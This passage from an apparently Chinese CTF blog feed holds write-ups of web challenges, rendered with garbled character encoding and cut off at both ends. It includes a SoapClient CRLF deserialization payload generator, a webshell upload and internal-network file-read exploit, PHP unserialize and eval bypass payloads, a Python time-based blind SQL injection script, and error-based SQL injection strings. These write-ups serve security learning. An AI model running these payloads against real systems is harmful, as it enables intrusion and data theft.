class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line"><span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type:application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length:'</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,</span><br><span class="line"><span class="string">'uri'</span>=&gt; <span class="string">"aaab"</span>));</span><br><span class="line"><span class="comment">//å› ä¸ºuser-agentæ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨crlfæ³¨å…¥httpå¤´æ¥å‘é€postè¯·æ±‚</span></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">'%0d%0a'</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'%26'</span>,$aaa);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> bin2hex($aaa);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†è·‘å‡ºçš„paylodaæ³¨å…¥è¿›æ•°æ®åº“ï¼Œè®¿é—®action=indexå³å¯è§¦å‘ååºåˆ—åŒ–ï¼Œä¹‹åç”¨æ–°çš„Cookieç™»å½•ï¼Œç”±äºè¯¥Cookieä¸adminç»‘å®šï¼Œå°†ä¼šç›´æ¥ä»¥adminèº«ä»½ç™»å½•ï¼Œä»è€Œç»•è¿‡äº†é™åˆ¶ã€‚</p><p>ç™»å½•ä»¥åæ˜¯ä¸€ä¸ªè£¸ä¼ æ–‡ä»¶ï¼Œç›´æ¥ä¸Šä¼ ä¸€ä¸ªshellï¼ŒAntswordè¿æ¥ã€‚</p><p>æ ¹æ®ä¹‹å‰æºç ä¸­çš„æç¤ºï¼Œflagåº”è¯¥åœ¨å†…ç½‘ï¼Œäºæ˜¯æˆ‘ä»¬åº·åº·æœ¬æœºåœ°å€å’Œ/etc/hostsï¼Œæ‰«ä¸€ä¸‹Cæ®µï¼Œå‘ç°åœ¨.7çš„80ç«¯å£æœ‰phpæ–‡ä»¶ï¼Œwgetä¿å­˜ä¸‹æ¥ä¸€çœ‹ï¼Œè²Œä¼¼åˆæ˜¯ä¸€é“åŸé¢˜ï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/09/26/gRFNxv.png" alt=""></p><p>ç›´æ¥è´´ä¸€ä¸ªglzjinå¸ˆå‚…çš„phpè„šæœ¬Orzï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$curl = curl_init();</span><br><span class="line"></span><br><span class="line">curl_setopt_array($curl, <span class="keyword">array</span>(</span><br><span class="line">  CURLOPT_URL =&gt; <span class="string">"http://172.16.54.2"</span>,</span><br><span class="line">  CURLOPT_RETURNTRANSFER =&gt; <span class="keyword">true</span>,</span><br><span class="line">  CURLOPT_ENCODING =&gt; <span class="string">""</span>,</span><br><span class="line">  CURLOPT_MAXREDIRS =&gt; <span class="number">10</span>,</span><br><span class="line">  CURLOPT_TIMEOUT =&gt; <span class="number">30</span>,</span><br><span class="line">  CURLOPT_HTTP_VERSION =&gt; CURL_HTTP_VERSION_1_1,</span><br><span class="line">  CURLOPT_CUSTOMREQUEST =&gt; <span class="string">"POST"</span>,</span><br><span class="line">  CURLOPT_POSTFIELDS =&gt; <span class="string">"------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"glzjin2.php\"\r\nContent-Type: false\r\n\r\n@&lt;?php echo `find /etc -name *flag* -exec cat &#123;&#125; +`;\r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"hello\"\r\n\r\nglzjin2.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file[2]\"\r\n\r\n222\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file[1]\"\r\n\r\n111\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file[0]\"\r\n\r\n/../glzjin2.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nSubmit\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"</span>,</span><br><span class="line">  CURLOPT_HTTPHEADER =&gt; <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"Postman-Token: a23f25ff-a221-47ef-9cfc-3ef4bd560c22"</span>,</span><br><span class="line">    <span class="string">"cache-control: no-cache"</span>,</span><br><span class="line">    <span class="string">"content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"</span></span><br><span class="line">  ),</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$response = curl_exec($curl);</span><br><span class="line">$err = curl_error($curl);</span><br><span class="line"></span><br><span class="line">curl_close($curl);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($err) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"cURL Error #:"</span> . $err;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> $response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>PS:</strong> ncæ‰«æä¸»æœºç«¯å£ï¼š<code>nc -z -v host_name port_range</code>ã€‚</p><p>æœ€åå³å¯è·å¾—flagï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/09/26/gRFbrL.png" alt=""></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>shellshellshellè¿™é“é¢˜å­¦åˆ°å¾ˆå¤šï¼Œä¹‹ååº”è¯¥ä¼šæ·±å…¥å­¦ä¹ ä¸€ä¸‹SoapClientçš„ååºåˆ—åŒ– ( æœ‰æ—¶é—´çš„è¯ï¼Œå’•å’•å’•</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æœ€è¿‘æ·±æ„Ÿè‡ªå·±è¯­è¨€åŸºç¡€å·®ï¼Œå¾—æ¶è¡¥ä¸€ä¸‹äº†= =&lt;/p&gt;
&lt;h2 id=&quot;SSRFMe&quot;&gt;&lt;a href=&quot;#SSRFMe&quot; class=&quot;hea
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€äº›åŸºç¡€é¢˜</title>
    <link href="https://www.sketchplane.top/2019/09/02/%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E9%A2%98/"/>
    <id>https://www.sketchplane.top/2019/09/02/%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E9%A2%98/</id>
    <published>2019-09-02T15:39:56.000Z</published>
    <updated>2019-09-03T02:35:46.347Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ‰“æ¯”èµ›çš„æ—¶å€™ä¸€ä¸ªå˜é‡è¦†ç›–çœ‹äº†åŠå¤©ï¼Œè¿˜æ˜¯é˜Ÿé‡Œå¸ˆå‚…æé†’ç”¨php://inputï¼Œå‘ç°è‡ªå·±åŸºç¡€å¾ˆå¼±ï¼Œäºæ˜¯æŠŠåŸºç¡€å¹³å°çš„Webåˆ·äº†ä¸€éï¼Œè®°å½•ä¸‹ä¸€äº›æœ‰ä»·å€¼çš„é¢˜ç›®ã€‚</p><h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼šPHPååºåˆ—åŒ–ã€ä¸€äº›å°trick</strong></p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//flagåœ¨flag.phpé‡Œ</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd=<span class="string">'index.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/\w+\((?R)?\)/'</span>, <span class="keyword">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">'$a="'</span>.<span class="keyword">$this</span>-&gt;cmd.<span class="string">'";'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hack!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'fl'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'ag'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(@highlight_file(<span class="string">'index.php'</span>,<span class="keyword">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(preg_match(<span class="string">'/[A-Za-z0-9]+\(/i'</span>, $_GET[<span class="string">'fl'</span>]))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hack!!!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> unserialize($_GET[<span class="string">'ag'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€è·¯éå¸¸æ¸…æ™°ï¼šflç»•è¿‡æ­£åˆ™ã€agä¼ åºåˆ—åŒ–å¯¹è±¡å¹¶ç»•è¿‡æ­£åˆ™ï¼›é‡å†™$this-&gt;cmdæ‰§è¡Œå‘½ä»¤ã€‚</strong></p><p>ä½†æ˜¯è¿™é‡Œé¢æœ‰å‡ ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š</p><ul><li>agæ­£åˆ™çš„é€’å½’åŒ¹é…</li><li>eval()çš„å­—ç¬¦æ‹¼æ¥</li><li>echo unserialize()æŠ¥é”™é—®é¢˜</li></ul><p>agçš„é€’å½’åŒ¹é…é™åˆ¶äº†æˆ‘ä»¬ä¼ è¿›å»çš„å‡½æ•°ä¸èƒ½æœ‰å‚æ•°ï¼Œå½“ç„¶ï¼Œèƒ½å¤Ÿå‡½æ•°å¥—å‡½æ•°ï¼›eval(â€˜$a=â€â€¦you_payloadâ€¦â€;â€™)</p><p>éœ€è¦æˆ‘ä»¬æ„é€ è¯­å¥è¿›è¡Œæ‹¼æ¥ï¼›åƒecho unserialize($_GET[â€˜aâ€™])è¿™ç§ååºåˆ—åŒ–ä¸€èˆ¬éƒ½æ˜¯è°ƒç”¨<code>__toString()</code>æ–¹æ³•çš„ï¼Œç”¨__destruct()çš„è¯åœ¨æœ¬åœ°ä¼šæŠ¥é”™ï¼Œæˆ‘åœ¨æœ¬åœ°åˆ æ‰echoæˆ–è€…ç”¨ __toString()æ–¹æ³•éƒ½èƒ½æ­£å¸¸æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯é¢˜ç›®ç¯å¢ƒå°±ä¸è¡Œã€‚ã€‚å¦å¤–è¿™é‡Œæ„Ÿè°¢<strong>@å—æºŸ</strong>å¸ˆå‚…çš„æŒ‡ç‚¹hhhã€‚</p><p><code>payloadï¼š?fl=php(&amp;ag=O:4:&quot;flag&quot;:1:{s:3:&quot;cmd&quot;;s:57:&quot;print_r&quot;;$a(file_get_contents(getcwd().&quot;/flag.php&quot;));$b=&quot;&quot;;&quot;}</code></p><p><strong>PSï¼šè¿™é‡Œç”±äºä¸èƒ½ç»™å‡½æ•°ä¼ å‚ï¼Œä»æ‰‹å†Œä¸­æŸ¥äº†ä¸€ä¸ªè·å–å½“å‰ç›®å½•çš„getcwd()å‡½æ•°ï¼Œç„¶åæ‹¼æ¥å‡ºflag.phpçš„ç»å¯¹è·¯å¾„ã€‚</strong></p><h2 id="Dynamic"><a href="#Dynamic" class="headerlink" title="Dynamic"></a>Dynamic</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼šPHPåŠ¨æ€å‡½æ•°æ‰§è¡Œ</strong></p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$blacklist = [<span class="string">"system"</span>, <span class="string">"ini_set"</span>, <span class="string">"exec"</span>, <span class="string">"scandir"</span>, <span class="string">"shell_exec"</span>, <span class="string">"proc_open"</span>, <span class="string">"error_log"</span>, <span class="string">"ini_alter"</span>, <span class="string">"ini_set"</span>, <span class="string">"pfsockopen"</span>, <span class="string">"readfile"</span>, <span class="string">"echo"</span>, <span class="string">"file_get_contents"</span>, <span class="string">"readlink"</span>, <span class="string">"symlink"</span>, <span class="string">"popen"</span>, <span class="string">"fopen"</span>, <span class="string">"file"</span>, <span class="string">"fpassthru"</span>];</span><br><span class="line">$blacklist = array_merge($blacklist, get_defined_functions()[<span class="string">'internal'</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($blacklist <span class="keyword">as</span> $i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($_GET[cmd], $i)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hack'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_GET[cmd]);</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯æœ‰é»‘åå•ï¼Œé»‘åå•ç»•è¿‡å§¿åŠ¿å¾ˆå¤šï¼Œå…³é”®æ˜¯<code>$blacklist = array_merge($blacklist, get_defined_functions()[&#39;internal&#39;]);</code>è¿™å¥ï¼ŒæŠŠå†…ç½®å‡½æ•°éƒ½ç»™åŠ è¿›é»‘åå•äº†ã€‚ã€‚ã€‚</p><p>æ­£å¥½æœ€è¿‘Pç¥åœ¨<code>Kcon</code>ä¸Šæ¼”è®²çš„å†…å®¹å°±æ˜¯<code>phpçš„åŠ¨æ€ç‰¹æ€§</code>ï¼Œä¹‹å‰ä¹Ÿçœ‹åˆ°è¿‡ä»–å†™çš„ç±»ä¼¼æ–‡ç« ï¼Œè¿™é‡Œç›´æ¥å†™payloadï¼š</p><p><code>payloadï¼š?cmd=$a=&#39;php&#39;.&#39;info&#39;;$a();</code></p><h2 id="INSERT-INTOæ³¨å…¥"><a href="#INSERT-INTOæ³¨å…¥" class="headerlink" title="INSERT INTOæ³¨å…¥"></a>INSERT INTOæ³¨å…¥</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼šæ—¶é—´æ³¨å…¥è„šæœ¬ç¼–å†™</strong></p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¯XFFæ³¨å…¥ï¼Œå¦å¤–è¿‡æ»¤äº†â€,â€ã€‚</p><p>ç”±äºè¾“å…¥ä»€ä¹ˆéƒ½æ²¡æœ‰å›æ˜¾ï¼Œè¿™é‡Œå°è¯•æ—¶é—´ç›²æ³¨ï¼Œå‘ç°å¯è¡Œï¼›é€—å·è¿‡æ»¤ç”¨<code>from for</code>ä»£æ›¿ï¼Œç›´æ¥ä¸Šè„šæœ¬ã€‚</p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web15/"</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†ç ´é•¿åº¦</span></span><br><span class="line">max_length = <span class="number">100</span></span><br><span class="line"><span class="comment"># å­—ç¬¦é›†åˆ</span></span><br><span class="line">character = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"><span class="comment"># æ•°æ®åº“å</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment"># éå†æ¯ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, max_length):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> character:</span><br><span class="line">        xff = <span class="string">"1' and case when substr((select flag from flag) from %d for 1)='%s'  then sleep(5) else 1 end and '1'='1"</span> % (i, c)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            header = &#123;<span class="string">'X-Forwarded-For'</span>: xff&#125;</span><br><span class="line">            s.get(url, headers=header, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><strong>PSï¼šç›²æ³¨æ—¶å…ˆæ‰‹å·¥åˆ¤æ–­è¯­å¥ä¸å›æ˜¾å†ç¼–å†™è„šæœ¬ã€‚</strong></p><h2 id="è¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç™»é™†æ¡†"><a href="#è¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç™»é™†æ¡†" class="headerlink" title="è¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç™»é™†æ¡†"></a>è¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç™»é™†æ¡†</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼šæŠ¥é”™æ³¨å…¥</strong></p><p>å…ˆåœ¨admin_useræµ‹è¯•ï¼Œå‘ç°åŒå¼•å·æ—¶admin_passwdæŠ¥é”™ï¼Œäºæ˜¯åœ¨admin_passwdå¤„åˆ©ç”¨æŠ¥é”™æ³¨å…¥ï¼š</p><p>æ¯”è¾ƒå®ç”¨çš„å‡ ç§æŠ¥é”™æ³¨å…¥æ–¹æ³•ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and updatexml(1,concat('~',(your_payload),'~'),3) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and exp(~(<span class="keyword">select</span> * <span class="keyword">from</span> (your_payload) a) ); <span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(((your_payload)),<span class="keyword">floor</span> (<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼šè¶…è¿‡ä¸€è¡Œæ—¶ç”¨ <code>payload LIMIT 0,1</code>é€ä¸ªæŸ¥è¯¢</strong></p><p><code>payloadï¼šadmin_name=admin&amp;admin_passwd=123456&quot; and updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),3) #</code></p><p><strong>PSï¼šä»¥ä¸Šä¸‰æ¡éƒ½èƒ½æ‰“</strong></p><h2 id="PHP-encrypt-1"><a href="#PHP-encrypt-1" class="headerlink" title="PHP_encrypt_1"></a>PHP_encrypt_1</h2><p>åŠ å¯†è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);<span class="comment">//$klen=32</span></span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span><br><span class="line">        <span class="keyword">if</span> ($x == $klen) <span class="comment">//å¦‚æœ$x=32</span></span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„æ€å°±æ˜¯ç”Ÿæˆä¸æ˜æ–‡é•¿åº¦ç›¸ç­‰çš„å¯†é’¥æµï¼Œç„¶åå¯¹åº”ä½åŠ å¯†ã€‚</p><p>è§£å¯†è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($crypt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$crypt = base64_decode($crypt);</span><br><span class="line">$len = strlen($crypt);</span><br><span class="line">$key = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">$klen = strlen($key);</span><br><span class="line">$char = <span class="string">""</span>;</span><br><span class="line">$str = <span class="string">""</span>;</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span><br><span class="line">        <span class="keyword">if</span> ($x == $klen) <span class="comment">//å¦‚æœ$x=32</span></span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$len;$i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(ord($crypt[$i]) &gt;= ord($char[$i]))&#123;</span><br><span class="line">$str .= chr((ord($crypt[$i])-ord($char[$i])));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ord($crypt[$i]) &lt; ord($char[$i]))&#123;</span><br><span class="line">$str .= chr((ord($crypt[$i])+<span class="number">128</span>-ord($char[$i])));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span>($str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">decrypt(<span 